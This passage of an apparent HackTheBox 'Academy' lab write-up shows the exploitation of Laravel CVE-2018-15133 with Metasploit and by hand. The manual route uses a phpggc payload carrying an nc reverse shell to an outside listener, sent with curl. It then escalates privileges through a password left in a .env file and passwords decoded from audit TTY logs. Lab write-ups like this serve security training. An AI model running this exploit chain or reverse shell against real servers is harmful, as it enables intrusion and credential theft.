class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre>msf5 exploit<span class="o">(</span>unix/http/laravel_token_unserialize_exec<span class="o">)</span> <span class="o">&gt;</span> show options

Module options <span class="o">(</span>exploit/unix/http/laravel_token_unserialize_exec<span class="o">)</span>:

   Name       Current Setting                               Required  Description
   <span class="nt">----</span>       <span class="nt">---------------</span>                               <span class="nt">--------</span>  <span class="nt">-----------</span>
   APP_KEY    dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0<span class="o">=</span>  no        The <span class="nb">base64 </span>encoded APP_KEY string from the .env file
   Proxies                                                  no        A proxy chain of format <span class="nb">type</span>:host:port[,type:host:port][...]
   RHOSTS     10.10.10.215                                  <span class="nb">yes       </span>The target host<span class="o">(</span>s<span class="o">)</span>, range CIDR identifier, or hosts file with syntax <span class="s1">'file:&lt;path&gt;'</span>
   RPORT      80                                            <span class="nb">yes       </span>The target port <span class="o">(</span>TCP<span class="o">)</span>
   SSL        <span class="nb">false                                         </span>no        Negotiate SSL/TLS <span class="k">for </span>outgoing connections
   TARGETURI  /                                             <span class="nb">yes       </span>Path to target webapp
   VHOST      dev-staging-01.academy.htb                    no        HTTP server virtual host


Payload options <span class="o">(</span>cmd/unix/reverse_perl<span class="o">)</span>:

   Name   Current Setting  Required  Description
   <span class="nt">----</span>   <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
   LHOST  10.10.14.6       <span class="nb">yes       </span>The listen address <span class="o">(</span>an interface may be specified<span class="o">)</span>
   LPORT  4444             <span class="nb">yes       </span>The listen port


Exploit target:

   Id  Name
   <span class="nt">--</span>  <span class="nt">----</span>
   0   Automatic
</pre></table></code></div></div><p>Firing the exploit:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>msf5 exploit<span class="o">(</span>unix/http/laravel_token_unserialize_exec<span class="o">)</span> <span class="o">&gt;</span> run

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.14.6:4444
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Command shell session 1 opened <span class="o">(</span>10.10.14.6:4444 -&gt; 10.10.10.215:60468<span class="o">)</span> at 2020-11-10 11:21:19 +0530

<span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</pre></table></code></div></div><h3 id="method-2---manually">Method 2 - Manually</h3><p>Initially when I solved this box, I had some trouble with my MSF so instead I did it manually with reference to this <a href="https://github.com/kozmic/laravel-poc-CVE-2018-15133"><strong>POC</strong></a> and clone it to my directory</p><ul><li><p>APP_KEY = dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=</p></li><li><p>Step 1: Generate unserialize payload:</p></li></ul><p>To do this we need <code class="language-plaintext highlighter-rouge">phpggc</code> which can be clone from this <a href="https://github.com/ambionics/phpggc"><strong>Github Repo</strong></a> and using Laravel <code class="language-plaintext highlighter-rouge">RCE1</code> and <code class="language-plaintext highlighter-rouge">-b</code> flag to base64 encode the payload as specified in POC</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/academy/phpggc  |master ✓|
→ ./phpggc Laravel/RCE1 system <span class="s1">'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.67 8020 &gt;/tmp/f'</span> <span class="nt">-b</span>
<span class="nv">Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjc4OiJybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAxMC4xMC4xNC42NyA4MDIwID4vdG1wL2YiO30</span><span class="o">=</span>
</pre></table></code></div></div><ul><li>Step 2: Encrypting payload with APP_KEY to generate X-XSRF-TOKEN:</li></ul><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/academy/laravel-poc-CVE-2018-15133  |master ✓|
→ ./cve-2018-15133.php dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0<span class="o">=</span> <span class="nv">Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjc4OiJybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAxMC4xMC4xNC42NyA4MDIwID4vdG1wL2YiO30</span><span class="o">=</span>
PoC <span class="k">for </span>Unserialize vulnerability <span class="k">in </span>Laravel &lt;<span class="o">=</span> 5.6.29 <span class="o">(</span>CVE-2018-15133<span class="o">)</span> by @kozmic

HTTP header <span class="k">for </span>POST request:
X-XSRF-TOKEN: eyJpdiI6IjNDZ1ZxRitWQndDcDRCSFAxeVVHbGc9PSIsInZhbHVlIjoiOUEyeFRLQlZ2dmhtTldUUGdqZm5ZVmozOHZ1Zm5sbTg4VjBUZFViN1djOVRTcFlZekZRM1wvWnJDdkp3TEVxeUREdUdmWTh6T2dtdHNpanZya0pTRjZmRmZUSEU1VEtLT0xERk96OHN2VnUzS3ZENmt0N3FTaWZUdktXTXRSSFZBOGZORjU1OEhhZnRpRVNJbUdPcmlxZWkzRmdMVEJhd1N1Z0NZZURDbTZqZWxqdSsxcmJJU3RFVWxxV0xYVXJJSW5YSmxzbEwzXC94QzNNOGpWT1U1TEt5VzYzUGU0N0NOUE10OHZISHNhNWhGVk1DNXN0dG92RXQxaUsxOUFcLyt0eHdKMGlUK3N3bjVIcFFkdnNPSkVIem9EQzdqOEpWaVdYcnN2bFlBVzdLZnJxcUZxMTFyQ1RRWjgxXC90UEw2RzRQUU1HQVlXN3ZvOEM2WWhUY29wWVhIUT09IiwibWFjIjoiZTA5YzgzMGYzNTRiMTg5YzBkNWMyOGRmMTU0Nzg3NGY2YjU5YTMyMDhhZmVmYjRhMWM2NTNiOGQ4NTg1MDA2MiJ9
</pre></table></code></div></div><ul><li>Step 3: Sending Payload with Curl:</li></ul><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/academy
→ curl http://dev-staging-01.academy.htb/ <span class="nt">-X</span> POST <span class="nt">-H</span> <span class="s1">'X-XSRF-TOKEN:eyJpdiI6IjNDZ1ZxRitWQndDcDRCSFAxeVVHbGc9PSIsInZhbHVlIjoiOUEyeFRLQlZ2dmhtTldUUGdqZm5ZVmozOHZ1Zm5sbTg4VjBUZFViN1djOVRTcFlZekZRM1wvWnJDdkp3TEVxeUREdUdmWTh6T2dtdHNpanZya0pTRjZmRmZUSEU1VEtLT0xERk96OHN2VnUzS3ZENmt0N3FTaWZUdktXTXRSSFZBOGZORjU1OEhhZnRpRVNJbUdPcmlxZWkzRmdMVEJhd1N1Z0NZZURDbTZqZWxqdSsxcmJJU3RFVWxxV0xYVXJJSW5YSmxzbEwzXC94QzNNOGpWT1U1TEt5VzYzUGU0N0NOUE10OHZISHNhNWhGVk1DNXN0dG92RXQxaUsxOUFcLyt0eHdKMGlUK3N3bjVIcFFkdnNPSkVIem9EQzdqOEpWaVdYcnN2bFlBVzdLZnJxcUZxMTFyQ1RRWjgxXC90UEw2RzRQUU1HQVlXN3ZvOEM2WWhUY29wWVhIUT09IiwibWFjIjoiZTA5YzgzMGYzNTRiMTg5YzBkNWMyOGRmMTU0Nzg3NGY2YjU5YTMyMDhhZmVmYjRhMWM2NTNiOGQ4NTg1MDA2MiJ9'</span>
</pre></table></code></div></div><p>Voila! Getting a call back on <code class="language-plaintext highlighter-rouge">nc</code> listener:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/academy
→ nc <span class="nt">-lvnp</span> 8020
Ncat: Version 7.91 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
Ncat: Listening on :::8020
Ncat: Listening on 0.0.0.0:8020
Ncat: Connection from 10.10.10.215.
Ncat: Connection from 10.10.10.215:40824.
/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span></pre></table></code></div></div><p>Upgrading to full TTY:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nv">$ </span>python3 <span class="nt">-c</span> <span class="s2">"import pty;pty.spawn('/bin/bash')"</span>
www-data@academy:/var/www/html/htb-academy-dev-01/public<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</pre></table></code></div></div><h2 id="elevating-www-data---cry0l1t3">Elevating www-data -&gt; cry0l1t3</h2><h3 id="enumeration">Enumeration</h3><p>It appears there quite some users on the box:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>www-data@academy:/<span class="nv">$ </span><span class="nb">cat</span> /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
<span class="o">[</span>..SNIP..]
egre55:x:1000:1000:egre55:/home/egre55:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mrb3n:x:1001:1001::/home/mrb3n:/bin/sh
cry0l1t3:x:1002:1002::/home/cry0l1t3:/bin/sh
mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
21y4d:x:1003:1003::/home/21y4d:/bin/sh
ch4p:x:1004:1004::/home/ch4p:/bin/sh
g0blin:x:1005:1005::/home/g0blin:/bin/sh

www-data@academy:/home<span class="nv">$ </span><span class="nb">ls
</span>21y4d  ch4p  cry0l1t3  egre55  g0blin  mrb3n
</pre></table></code></div></div><p>User.txt is located inside home directory of cry0l1t3 which makes it our next go to user</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>www-data@academy:/home<span class="nv">$ </span>find <span class="nb">.</span> <span class="nt">-name</span> user.txt 2&gt;/dev/null

./cry0l1t3/user.txt
</pre></table></code></div></div><h3 id="password-discovery">Password Discovery</h3><p>The environment dump we saw in dev-staging-01.academy.htb error logs can also be found inside <code class="language-plaintext highlighter-rouge">www-data@academy:/var/www/html/htb-academy-dev-01</code> similar to this env file, we discover another env database file inside <code class="language-plaintext highlighter-rouge">/var/www/html/academy</code> which contains configuration information along with database connection details:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>www-data@academy:/var/www/html/academy<span class="nv">$ </span><span class="nb">cat</span> .env
<span class="nv">APP_NAME</span><span class="o">=</span>Laravel
<span class="nv">APP_ENV</span><span class="o">=</span><span class="nb">local
</span><span class="nv">APP_KEY</span><span class="o">=</span><span class="nb">base64</span>:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0<span class="o">=</span>
<span class="nv">APP_DEBUG</span><span class="o">=</span><span class="nb">false
</span><span class="nv">APP_URL</span><span class="o">=</span>http://localhost

<span class="nv">LOG_CHANNEL</span><span class="o">=</span>stack

<span class="nv">DB_CONNECTION</span><span class="o">=</span>mysql
<span class="nv">DB_HOST</span><span class="o">=</span>127.0.0.1
<span class="nv">DB_PORT</span><span class="o">=</span>3306
<span class="nv">DB_DATABASE</span><span class="o">=</span>academy
<span class="nv">DB_USERNAME</span><span class="o">=</span>dev
<span class="nv">DB_PASSWORD</span><span class="o">=</span>mySup3rP4s5w0rd!!

</pre></table></code></div></div><p>We find <code class="language-plaintext highlighter-rouge">mySup3rP4s5w0rd!!</code> which turns out to be cry0l1t3’s password.</p><h3 id="su---cry0l1t3">su - cry0l1t3</h3><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>www-data@academy:/<span class="nv">$ </span>su cry0l1t3
Password: mySup3rP4s5w0rd!!

<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>cry0l1t3<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>cry0l1t3<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1002<span class="o">(</span>cry0l1t3<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>
<span class="nv">$ </span><span class="nb">whoami
</span>cry0l1t3
</pre></table></code></div></div><p>We can even SSH to the user:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre>fx:  ~/Documents/htb/academy
→ ssh cry0l1t3@10.10.10.215
cry0l1t3@10.10.10.215<span class="s1">'s password:
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-52-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 12 Nov 2020 12:10:26 PM UTC

  System load:             0.0
  Usage of /:              44.6% of 15.68GB
  Memory usage:            17%
  Swap usage:              0%
  Processes:               179
  Users logged in:         0
  IPv4 address for ens160: 10.10.10.215
  IPv6 address for ens160: dead:beef::250:56ff:feb9:d933


0 updates can be installed immediately.
0 of these updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Nov 12 11:43:53 2020 from 10.10.14.20
$ id
uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)
</span></pre></table></code></div></div><p>Grabbing user.txt:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nv">$ </span>bash
cry0l1t3@academy:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
c3d927d8105ef6<span class="k">******************</span>
</pre></table></code></div></div><h2 id="elevating-cry0l1t3---mrb3n">Elevating cry0l1t3 -&gt; mrb3n</h2><h3 id="enumeration-1">Enumeration</h3><p>User cry0l1t3 is a member of adm group:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>cry0l1t3@academy:~<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>cry0l1t3<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>cry0l1t3<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1002<span class="o">(</span>cry0l1t3<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>
</pre></table></code></div></div><blockquote><p>Group adm is used for system monitoring tasks. Members of this group can read many log files in /var/log, and can use xconsole. Historically, /var/log was /usr/adm (and later /var/adm), thus the name of the group.</p></blockquote><h3 id="log-analysis">Log Analysis</h3><p>So while going through the audit logs, I came across this <a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/security_guide/sec-audit_record_types"><strong>redhat doc</strong></a> which gives us an insight of type of audit logs.</p><p>We see an entry for TTY type:</p><ul><li>TTY : Triggered when TTY input was sent to an administrative process.</li></ul><p>Hence TTY type was captured when some administrative process was triggered, Grepping recursively for TTY we see the following output:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>cry0l1t3@academy:/var/log/audit<span class="nv">$ </span><span class="nb">grep</span> <span class="nt">-r</span> TTY
audit.log.3:type<span class="o">=</span>TTY <span class="nv">msg</span><span class="o">=</span>audit<span class="o">(</span>1597199290.086:83<span class="o">)</span>: <span class="nb">tty </span><span class="nv">pid</span><span class="o">=</span>2517 <span class="nv">uid</span><span class="o">=</span>1002 <span class="nv">auid</span><span class="o">=</span>0 <span class="nv">ses</span><span class="o">=</span>1 <span class="nv">major</span><span class="o">=</span>4 <span class="nv">minor</span><span class="o">=</span>1 <span class="nb">comm</span><span class="o">=</span><span class="s2">"sh"</span> <span class="nv">data</span><span class="o">=</span>7375206D7262336E0A
audit.log.3:type<span class="o">=</span>TTY <span class="nv">msg</span><span class="o">=</span>audit<span class="o">(</span>1597199293.906:84<span class="o">)</span>: <span class="nb">tty </span><span class="nv">pid</span><span class="o">=</span>2520 <span class="nv">uid</span><span class="o">=</span>1002 <span class="nv">auid</span><span class="o">=</span>0 <span class="nv">ses</span><span class="o">=</span>1 <span class="nv">major</span><span class="o">=</span>4 <span class="nv">minor</span><span class="o">=</span>1 <span class="nb">comm</span><span class="o">=</span><span class="s2">"su"</span> <span class="nv">data</span><span class="o">=</span>6D7262336E5F41634064336D79210A
audit.log.3:type<span class="o">=</span>TTY <span class="nv">msg</span><span class="o">=</span>audit<span class="o">(</span>1597199304.778:89<span class="o">)</span>: <span class="nb">tty </span><span class="nv">pid</span><span class="o">=</span>2526 <span class="nv">uid</span><span class="o">=</span>1001 <span class="nv">auid</span><span class="o">=</span>0 <span class="nv">ses</span><span class="o">=</span>1 <span class="nv">major</span><span class="o">=</span>4 <span class="nv">minor</span><span class="o">=</span>1 <span class="nb">comm</span><span class="o">=</span><span class="s2">"sh"</span> <span class="nv">data</span><span class="o">=</span>77686F616D690A
audit.log.3:type<span class="o">=</span>TTY <span class="nv">msg</span><span class="o">=</span>audit<span class="o">(</span>1597199308.262:90<span class="o">)</span>: <span class="nb">tty </span><span class="nv">pid</span><span class="o">=</span>2526 <span class="nv">uid</span><span class="o">=</span>1001 <span class="nv">auid</span><span class="o">=</span>0 <span class="nv">ses</span><span class="o">=</span>1 <span class="nv">major</span><span class="o">=</span>4 <span class="nv">minor</span><span class="o">=</span>1 <span class="nb">comm</span><span class="o">=</span><span class="s2">"sh"</span> <span class="nv">data</span><span class="o">=</span>657869740A
audit.log.3:type<span class="o">=</span>TTY <span class="nv">msg</span><span class="o">=</span>audit<span class="o">(</span>1597199317.622:93<span class="o">)</span>: <span class="nb">tty </span><span class="nv">pid</span><span class="o">=</span>2517 <span class="nv">uid</span><span class="o">=</span>1002 <span class="nv">auid</span><span class="o">=</span>0 <span class="nv">ses</span><span class="o">=</span>1 <span class="nv">major</span><span class="o">=</span>4 <span class="nv">minor</span><span class="o">=</span>1 <span class="nb">comm</span><span class="o">=</span><span class="s2">"sh"</span> <span class="nv">data</span><span class="o">=</span>2F62696E2F62617368202D690A
audit.log.3:type<span class="o">=</span>TTY <span class="nv">msg</span><span class="o">=</span>audit<span class="o">(</span>1597199443.421:94<span class="o">)</span>: <span class="nb">tty </span><span class="nv">pid</span><span class="o">=</span>2606 <span class="nv">uid</span><span class="o">=</span>1002 <span class="nv">auid</span><span class="o">=</span>0 <span class="nv">ses</span><span class="o">=</span>1 <span class="nv">major</span><span class="o">=</span>4 <span class="nv">minor</span><span class="o">=</span>1 <span class="nb">comm</span><span class="o">=</span><span class="s2">"nano"</span> <span class="nv">data</span><span class="o">=</span>1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E1B5B421B5B337E1B5B337E1B5B337E1B5B337E1B5B337E18790D

<span class="o">[</span>..SNIP..]
</pre></table></code></div></div><p>Looking at the first log entry: <code class="language-plaintext highlighter-rouge">audit.log.3:type=TTY msg=audit(1597199290.086:83): tty pid=2517 uid=1002 auid=0 ses=1 major=4 minor=1 comm="sh" data=7375206D7262336E0A</code> It appears the user with <code class="language-plaintext highlighter-rouge">uid=1002</code> ran some command in <code class="language-plaintext highlighter-rouge">sh</code> and the command is stored in hex <code class="language-plaintext highlighter-rouge">7375206D7262336E0A</code></p><blockquote><p>The comm field records the command-line name of the command that was used to invoke the analysed process.</p></blockquote><p>We can decode it:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>cry0l1t3@academy:/var/log/audit<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'7375206D7262336E0A'</span> | xxd <span class="nt">-r</span> <span class="nt">-p</span>
su mrb3n
</pre></table></code></div></div><p>Onto the next entry <code class="language-plaintext highlighter-rouge">audit.log.3:type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm="su" data=6D7262336E5F41634064336D79210A</code></p><p>Here <code class="language-plaintext highlighter-rouge">comm="su"</code> appears to be command and data is <code class="language-plaintext highlighter-rouge">6D7262336E5F41634064336D79210A</code> which is in hex format.</p><p>Decoding the command value:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>cry0l1t3@academy:/var/log/audit<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'6D7262336E5F41634064336D79210A'</span> | xxd <span class="nt">-r</span> <span class="nt">-p</span>
mrb3n_Ac@d3my!
</pre></table></code></div></div><h3 id="su---mrb3n">su - mrb3n</h3><p>Appears to be the password used for <code class="language-plaintext highlighter-rouge">su mrb3n</code> command, we can su with this:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>cry0l1t3@academy:~<span class="nv">$ </span>su mrb3n
Password:
<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>mrb3n<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>mrb3n<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>mrb3n<span class="o">)</span>
</pre></table></code></div></div><p>Alternatively log analysis could also be achieved using a tool called <code class="language-plaintext highlighter-rouge">aureport</code> using the option <code class="language-plaintext highlighter-rouge">--tty</code> which shows TTY keystrokes, turns out it also shows password in clear text:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre>cry0l1t3@academy:~<span class="nv">$ </span>aureport <span class="nt">--tty</span>

TTY Report
<span class="o">===============================================</span>
<span class="c"># date time event auid term sess comm data</span>
<span class="o">===============================================</span>
Error opening config file <span class="o">(</span>Permission denied<span class="o">)</span>
NOTE - using built-in logs: /var/log/audit/audit.log
1. 08/12/2020 02:28:10 83 0 ? 1 sh <span class="s2">"su mrb3n"</span>,&lt;<span class="nb">nl</span><span class="o">&gt;</span>
2. 08/12/2020 02:28:13 84 0 ? 1 su <span class="s2">"mrb3n_Ac@d3my!"</span>,&lt;<span class="nb">nl</span><span class="o">&gt;</span>
3. 08/12/2020 02:28:24 89 0 ? 1 sh <span class="s2">"whoami"</span>,&lt;<span class="nb">nl</span><span class="o">&gt;</span>
4. 08/12/2020 02:28:28 90 0 ? 1 sh <span class="s2">"exit"</span>,&lt;<span class="nb">nl</span><span class="o">&gt;</span>
5. 08/12/2020 02:28:37 93 0 ? 1 sh <span class="s2">"/bin/bash -i"</span>,&lt;<span class="nb">nl</span><span class="o">&gt;</span>
6. 08/12/2020 02:30:43 94 0 ? 1 nano &lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;down&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;down&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;down&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;down&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;^X&gt;,<span class="s2">"y"</span>,&lt;ret&gt;
7. 08/12/2020 02:32:13 95 0 ? 1 nano &lt;down&gt;,&lt;up&gt;,&lt;up&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;down&gt;,&lt;backspace&gt;,&lt;down&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;delete&gt;,&lt;^X&gt;,<span class="s2">"y"</span>,&lt;ret&gt;
8. 08/12/2020 02:32:55 96 0 ? 1 nano <span class="s2">"6"</span>,&lt;^X&gt;,<span class="s2">"y"</span>,&lt;ret&gt;
